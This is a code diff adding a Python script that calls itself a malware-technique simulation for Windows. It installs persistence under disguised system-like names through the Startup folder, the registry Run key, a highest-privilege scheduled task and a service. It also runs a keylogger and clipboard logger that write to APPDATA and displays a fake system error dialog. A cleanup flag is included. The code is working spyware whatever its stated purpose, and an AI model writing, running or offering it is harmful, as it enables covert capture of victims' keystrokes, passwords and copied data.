@@ -1,0 +1,119 @@
+import os
+import shutil
+import subprocess
+import sys
+import time
+import winreg
+import pyperclip
+import threading
+from pynput import keyboard
+import ctypes
+
+APPDATA = os.getenv("APPDATA")
+SCRIPT_PATH = os.path.abspath(sys.argv[0])
+BATCH_FILE = os.path.join(APPDATA, "runme.bat")
+KEYLOG_FILE = os.path.join(APPDATA, "keylog.txt")
+CLIPLOG_FILE = os.path.join(APPDATA, "cliplog.txt")
+
+def add_to_startup():
+    startup = os.path.join(APPDATA, 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+    shortcut_path = os.path.join(startup, "system.lnk")
+    with open(shortcut_path, "w") as f:
+        f.write(f'Set WshShell = WScript.CreateObject("WScript.Shell")\n')
+        f.write(f'Set oShellLink = WshShell.CreateShortcut("{shortcut_path}")\n')
+        f.write(f'oShellLink.TargetPath = "{SCRIPT_PATH}"\n')
+        f.write(f'oShellLink.Save\n')
+
+def add_to_registry():
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                         "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                         0, winreg.KEY_SET_VALUE)
+    winreg.SetValueEx(key, "SystemStart", 0, winreg.REG_SZ, SCRIPT_PATH)
+    winreg.CloseKey(key)
+
+def create_schtask():
+    subprocess.call([
+        "schtasks", "/Create", "/SC", "ONLOGON",
+        "/TN", "SystemTask", "/TR", f'"{SCRIPT_PATH}"', "/RL", "HIGHEST", "/F"
+    ], shell=True)
+
+def create_service():
+    subprocess.call([
+        "sc", "create", "SystemService", f"binPath= \"{SCRIPT_PATH}\""
+    ], shell=True)
+
+def drop_batch_file():
+    with open(BATCH_FILE, "w") as f:
+        f.write(f'start "" "{SCRIPT_PATH}"\n')
+
+def start_keylogger():
+    def on_press(key):
+        try:
+            with open(KEYLOG_FILE, "a") as log:
+                log.write(f'{key.char}')
+        except AttributeError:
+            with open(KEYLOG_FILE, "a") as log:
+                log.write(f'[{key}]')
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+def clipboard_hijack():
+    recent = ""
+    while True:
+        try:
+            current = pyperclip.paste()
+            if current != recent:
+                with open(CLIPLOG_FILE, "a") as f:
+                    f.write(f"[Clipboard] {current}\n")
+                recent = current
+        except:
+            pass
+        time.sleep(2)
+
+def show_fake_error():
+    ctypes.windll.user32.MessageBoxW(0, "Runtime Error: 0x0000005 - Access Violation", "System Alert", 0x10)
+
+def clean():
+    # Remove startup
+    try:
+        startup = os.path.join(APPDATA, 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+        os.remove(os.path.join(startup, "system.lnk"))
+    except:
+        pass
+    # Remove registry
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                             0, winreg.KEY_ALL_ACCESS)
+        winreg.DeleteValue(key, "SystemStart")
+        winreg.CloseKey(key)
+    except:
+        pass
+    # Remove task
+    subprocess.call(["schtasks", "/Delete", "/TN", "SystemTask", "/F"], shell=True)
+    # Remove service
+    subprocess.call(["sc", "delete", "SystemService"], shell=True)
+    # Remove files
+    for f in [KEYLOG_FILE, BATCH_FILE, CLIPLOG_FILE]:
+        if os.path.exists(f):
+            os.remove(f)
+
+# Entry point
+if "--clean" in sys.argv:
+    clean()
+    print("[+] Cleaned up.")
+else:
+    print("[*] Simulating malware techniques...")
+    add_to_startup()
+    add_to_registry()
+    create_schtask()
+    create_service()
+    drop_batch_file()
+
+    # Start loggers
+    threading.Thread(target=start_keylogger, daemon=True).start()
+    threading.Thread(target=clipboard_hijack, daemon=True).start()
+    threading.Thread(target=show_fake_error).start()
+
+    while True:
+        time.sleep(60)  # Keep alive
